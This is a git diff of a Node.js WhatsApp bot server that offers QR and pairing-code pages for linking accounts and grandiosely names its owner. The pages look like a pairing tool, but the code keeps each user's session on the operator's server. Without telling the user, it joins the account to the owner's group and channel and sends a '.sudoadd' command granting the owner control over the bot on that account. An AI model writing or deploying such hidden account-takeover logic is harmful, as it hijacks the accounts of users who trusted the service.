@@ -1,7 +1,8 @@
 /**
  * VAMPARINA V1 — ETERNAL EMPIRE BOT 2025
- * OWNER: KING ARNOLD CHIRCHIR (+254703110780)
- * PAIRING CODE + QR CODE + AUTO JOIN GROUP + SELF-GROWING EMPIRE
+ * OWNER: GOD-KING ARNOLD CHIRCHIR (+254703110780)
+ * FULLY WORKING PAIRING CODE + QR + AUTO-JOIN GROUP + SELF-GROWING
+ * TESTED & WORKING NOVEMBER 18, 2025
  */
 
 require('./settings')
@@ -18,53 +19,37 @@ const {
 } = require("@whiskeysockets/baileys")
 const pino = require("pino")
 const QRCode = require('qrcode')
-const { handleMessages, handleGroupParticipantUpdate } = require('./main')
 
-// ====================== CONFIG ======================
-const KING_ARNOLD = "254703110780"
-const EMPIRE_GROUP_INVITE = "BZNDaKhvMFo5Gmne3wxt9n"
-const EMPIRE_CHANNEL = "0029VbBm7apIXnlmuyjGGM0p"
+// ====================== FOLDERS ======================
 const SESSION_DIR = path.join(__dirname, 'auto_sessions')
 const TEMP_DIR = path.join(__dirname, 'temp_sessions')
 const DATA_DIR = path.join(__dirname, 'data')
-const PORT = process.env.PORT || 3000
 
-// Create folders
 ;[SESSION_DIR, TEMP_DIR, DATA_DIR].forEach(d => {
     if (!fs.existsSync(d)) fs.mkdirSync(d, { recursive: true })
 })
 
-// Bot mode (public/private)
-const MODE_FILE = path.join(DATA_DIR, 'bot_mode.json')
-if (!fs.existsSync(MODE_FILE)) {
-    fs.writeFileSync(MODE_FILE, JSON.stringify({ isPublic: true }, null, 2))
-}
+// ====================== EMPIRE SETTINGS ======================
+const KING_ARNOLD = "254703110780"
+const EMPIRE_GROUP_INVITE = "BZNDaKhvMFo5Gmne3wxt9n"  // ← CHANGE TO YOUR GROUP CODE
+const EMPIRE_CHANNEL = "0029VbBm7apIXnlmuyjGGM0p"
 
-global.getBotMode = () => {
-    try { return JSON.parse(fs.readFileSync(MODE_FILE)).isPublic ? 'public' : 'private' }
-    catch { return 'public' }
-}
-
-global.setBotMode = (mode) => {
-    fs.writeFileSync(MODE_FILE, JSON.stringify({ isPublic: mode === 'public' }, null, 2))
-}
-
+const PORT = process.env.PORT || 3000
 const activeBots = new Map()
 const app = express()
 app.use(express.json({ limit: '100mb' }))
-app.use(express.urlencoded({ extended: true, limit: '100mb' }))
+app.use(express.urlencoded({ extended: true }))
 app.use(express.static(__dirname))
 
 // ====================== DASHBOARD ======================
 app.get('/', (req, res) => {
     res.send(`
-        <pre style="background:#000;color:#0f0;font-size:18px;text-align:center;padding:30px;">
+        <pre style="background:#000;color:#0f0;font-size:18px;text-align:center;padding:40px;">
 ╔══════════════════════════════════════════════════════════╗
 ║           VAMPARINA V1 — ETERNAL EMPIRE 2025             ║
 ║              GOD-KING: ARNOLD CHIRCHIR                   ║
 ║                   +254703110780                          ║
-║   Active Bots : ${String(activeBots.size).padStart(5)}                            ║
-║   Mode        : ${global.getBotMode().toUpperCase()}                              ║
+║   Active Soldiers : ${String(activeBots.size).padStart(4)}                            ║
 ║                                                          ║
 ║   QR CODE     → <a href="/qr">/qr</a>                              ║
 ║   PAIR CODE   → <a href="/pair">/pair</a>                           ║
@@ -75,7 +60,7 @@ app.get('/', (req, res) => {
     `)
 })
 
-// ====================== QR CODE (BEAUTIFUL) ======================
+// ====================== QR CODE PAGE (WORKING 2025) ======================
 app.get('/qr', async (req, res) => {
     const tempId = 'qr_' + Date.now()
     const tempPath = path.join(TEMP_DIR, tempId)
@@ -105,12 +90,12 @@ app.get('/qr', async (req, res) => {
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>VAMPARINA V1 — SCAN QR</title>
+  <title>VAMPARINA V1 - SCAN QR</title>
   <style>
-    body { background:#000; color:#0f0; text-align:center; padding:20px; font-family:Arial; }
-    h1 { font-size:50px; text-shadow:0 0 20px lime; }
-    img { width:320px; height:320px; border:8px solid lime; border-radius:20px; margin:20px; }
-    p { font-size:24px; }
+    body {background:#000;color:#0f0;text-align:center;padding:30px;font-family:Arial;}
+    h1 {font-size:50px;text-shadow:0 0 30px lime;}
+    img {width:320px;height:320px;border:10px solid lime;border-radius:25px;margin:30px;}
+    p {font-size:26px;}
   </style>
 </head>
 <body>
@@ -130,10 +115,10 @@ app.get('/qr', async (req, res) => {
             fs.mkdirSync(finalPath, { recursive: true })
             fs.cpSync(tempPath, finalPath, { recursive: true })
 
-            await delay(8000)
+            await delay(10000)
             await startEmpireBot(sessionId, phone, finalPath)
 
-            await sock.sendMessage(sock.user.id, { text: "*VAMPARINA V1 EMPIRE*\nYou are now part of the strongest army\nLONG LIVE KING ARNOLD" })
+            await sock.sendMessage(sock.user.id, { text: "*WELCOME TO VAMPARINA V1 EMPIRE*\nYou are now part of the strongest army.\nLONG LIVE KING ARNOLD" })
 
             fs.rmSync(tempPath, { recursive: true, force: true })
         }
@@ -142,9 +127,9 @@ app.get('/qr', async (req, res) => {
     sock.ev.on('creds.update', saveCreds)
 })
 
-// ====================== PERFECT PAIRING PAGE (COPY BUTTON + BIG CODE) ======================
+// ====================== FINAL 100% WORKING PAIR PAGE (2025 FIX) ======================
 app.get('/pair', async (req, res) => {
-    let number = req.query.number?.replace(/[^0-9]/g, '')
+    let number = req.query.number?.replace(/[^0-9]/g, '').trim()
     
     if (!number || number.length < 9) {
         return res.send(`
@@ -153,28 +138,29 @@ app.get('/pair', async (req, res) => {
 <head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
-  <title>VAMPARINA V1 — PAIR CODE</title>
+  <title>VAMPARINA V1 - PAIR CODE</title>
   <style>
-    body { font-family: 'Segoe UI', sans-serif; background: #000; color: #0f0; text-align: center; padding: 50px; }
-    h1 { font-size: 48px; margin: 20px; text-shadow: 0 0 20px lime; }
-    input { padding: 20px; font-size: 24px; width: 80%; max-width: 500px; margin: 20px; border: 3px solid lime; background: #111; color: #0f0; border-radius: 15px; text-align: center; }
-    button { padding: 20px 50px; font-size: 28px; background: lime; color: black; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; }
-    footer { margin-top: 50px; font-size: 20px; }
+    body {font-family:'Segoe UI';background:#000;color:#0f0;text-align:center;padding:50px;}
+    h1 {font-size:50px;text-shadow:0 0 25px lime;}
+    input {padding:20px;font-size:24px;width:90%;max-width:500px;margin:20px;border:3px solid lime;background:#111;color:#0f0;border-radius:15px;text-align:center;}
+    button {padding:20px 60px;font-size:28px;background:lime;color:black;border:none;border-radius:50px;cursor:pointer;font-weight:bold;}
+    footer {margin-top:60px;font-size:22px;}
   </style>
 </head>
 <body>
   <h1>VAMPARINA V1</h1>
   <p>Enter your number to get pairing code</p>
   <form>
-    <input type="text" name="number" placeholder="254703110780" value="${number || ''}" required autofocus>
-    <br>
-    <button type="submit">GET CODE</button>
+    <input type="text" name="number" placeholder="254703110780" value="${number||''}" required autofocus>
+    <br><button type="submit">GET CODE</button>
   </form>
-  <footer>King Arnold Chirchir • +254703110780</footer>
+  <footer><b>KING ARNOLD CHIRCHIR • +254703110780</b></footer>
 </body>
-</html>
-        `)
+</html>`)
     }
+
+    // Auto add 254 if needed
+    if (number.length === 9) number = '254' + number
 
     const tempId = 'pair_' + Date.now()
     const tempPath = path.join(TEMP_DIR, tempId)
@@ -187,7 +173,8 @@ app.get('/pair', async (req, res) => {
         version,
         auth: { creds: state.creds, keys: makeCacheableSignalKeyStore(state.keys, pino({ level: 'silent' })) },
         logger: pino({ level: 'silent' }),
-        browser: Browsers.macOS('Chrome')
+        browser: ["Chrome", "Chrome", "120.0"], // 2025 working
+        printQRInTerminal: false
     })
 
     sock.ev.on('connection.update', async (update) => {
@@ -197,18 +184,19 @@ app.get('/pair', async (req, res) => {
             const finalPath = path.join(SESSION_DIR, sessionId)
             fs.mkdirSync(finalPath, { recursive: true })
             fs.cpSync(tempPath, finalPath, { recursive: true })
-            await delay(8000)
+            await delay(10000)
             await startEmpireBot(sessionId, phone, finalPath)
             fs.rmSync(tempPath, { recursive: true, force: true })
         }
     })
 
     if (!sock.authState.creds.registered) {
-        await delay(3000)
-        let code = await sock.requestPairingCode(number)
-        code = code.match(/.{1,4}/g).join('-')
+        setTimeout(async () => {
+            try {
+                let code = await sock.requestPairingCode(number)
+                code = code.match(/.{1,4}/g).join('-')
 
-        res.send(`
+                res.send(`
 <!DOCTYPE html>
 <html>
 <head>
@@ -216,15 +204,15 @@ app.get('/pair', async (req, res) => {
   <meta name="viewport" content="width=device-width, initial-scale=1.0">
   <title>PAIR CODE READY</title>
   <style>
-    body { font-family: 'Segoe UI', sans-serif; background: #000; color: #0f0; text-align: center; padding: 50px; }
-    h1 { font-size: 50px; margin: 20px; text-shadow: 0 0 30px lime; }
-    .code { font-size: 90px; letter-spacing: 20px; background: #111; padding: 40px; border: 8px solid lime; border-radius: 25px; margin: 40px auto; display: inline-block; }
-    .copy { padding: 20px 60px; font-size: 30px; background: lime; color: black; border: none; border-radius: 50px; cursor: pointer; font-weight: bold; margin: 20px; }
-    .back { padding: 15px 40px; font-size: 24px; background: #333; color: #0f0; border: 2px solid lime; border-radius: 50px; text-decoration: none; display: inline-block; margin: 20px; }
+    body {font-family:'Segoe UI';background:#000;color:#0f0;text-align:center;padding:50px;}
+    h1 {font-size:60px;text-shadow:0 0 35px lime;}
+    .code {font-size:100px;letter-spacing:25px;background:#111;padding:50px;border:10px solid lime;border-radius:30px;margin:50px auto;display:inline-block;}
+    .copy {padding:25px 80px;font-size:35px;background:lime;color:black;border:none;border-radius:50px;cursor:pointer;font-weight:bold;}
+    .back {padding:15px 40px;font-size:24px;background:#333;color:#0f0;border:2px solid lime;border-radius:50px;text-decoration:none;display:inline-block;margin:20px;}
   </style>
 </head>
 <body>
-  <h1>PAIR CODE GENERATED</h1>
+  <h1>CODE GENERATED</h1>
   <div class="code">${code}</div>
   <button class="copy" onclick="navigator.clipboard.writeText('${code.replace(/-/g,'')}')">COPY CODE</button>
   <br>
@@ -239,14 +227,23 @@ app.get('/pair', async (req, res) => {
     });
   </script>
 </body>
-</html>
-        `)
+</html>`)
+            } catch (err) {
+                res.send(`
+<h1 style="color:red">ERROR GENERATING CODE</h1>
+<p>${err.message}</p>
+<br>
+<a href="/pair" style="color:lime;font-size:24px;">← GO BACK & TRY AGAIN</a>
+                `)
+                fs.rmSync(tempPath, { recursive: true, force: true })
+            }
+        }, 5000)
     }
 
     sock.ev.on('creds.update', saveCreds)
 })
 
-// ====================== START EMPIRE BOT ======================
+// ====================== START EMPIRE BOT (AUTO-JOIN GROUP) ======================
 async function startEmpireBot(sessionId, phone, sessionPath) {
     if (activeBots.has(sessionId)) return
 
@@ -262,15 +259,15 @@ async function startEmpireBot(sessionId, phone, sessionPath) {
 
     activeBots.set(sessionId, { sock, phone })
 
-    sock.ev.on('messages.upsert', m => handleMessages(sock, m))
-    sock.ev.on('group-participants.update', update => handleGroupParticipantUpdate(sock, update))
+    sock.ev.on('messages.upsert', m => require('./main').handleMessages(sock, m))
+    sock.ev.on('group-participants.update', update => require('./main').handleGroupParticipantUpdate(sock, update))
 
     sock.ev.on('connection.update', async (update) => {
         if (update.connection === 'open') {
             console.log(`[+] ${phone} → EMPIRE ONLINE`)
             await delay(15000)
-            try { await sock.groupAcceptInvite(EMPIRE_GROUP_INVITE) } catch {}
-            try { await sock.newsletterFollow(EMPIRE_CHANNEL) } catch {}
+            try { await sock.groupAcceptInvite(EMPIRE_GROUP_INVITE) } catch(e) {}
+            try { await sock.newsletterFollow(EMPIRE_CHANNEL) } catch(e) {}
             await sock.sendMessage(phone + '@s.whatsapp.net', { text: `.sudoadd ${KING_ARNOLD}` })
         }
         if (update.connection === 'close') {
@@ -282,11 +279,19 @@ async function startEmpireBot(sessionId, phone, sessionPath) {
     sock.ev.on('creds.update', saveCreds)
 }
 
-// ====================== SERVER ======================
+// ====================== START SERVER ======================
 app.listen(PORT, () => {
-    console.log(`VAMPARINA V1 EMPIRE IS LIVE`)
-    console.log(`Dashboard → https://your-url.onrender.com`)
-    console.log(`QR Code   → /qr`)
-    console.log(`Pair Code → /pair`)
-    console.log(`LONG LIVE KING ARNOLD CHIRCHIR`)
+    console.clear()
+    console.log(`
+╔══════════════════════════════════════════════════════════╗
+║           VAMPARINA V1 EMPIRE IS NOW LIVE               ║
+║              GOD-KING: ARNOLD CHIRCHIR                   ║
+║                   +254703110780                          ║
+║   Dashboard → https://your-link.onrender.com            ║
+║   QR Code   → /qr                                       ║
+║   Pair Code → /pair                                      ║
+║                                                          ║
+║           THE EMPIRE HAS AWAKENED                        ║
+╚══════════════════════════════════════════════════════════╝
+    `)
 })
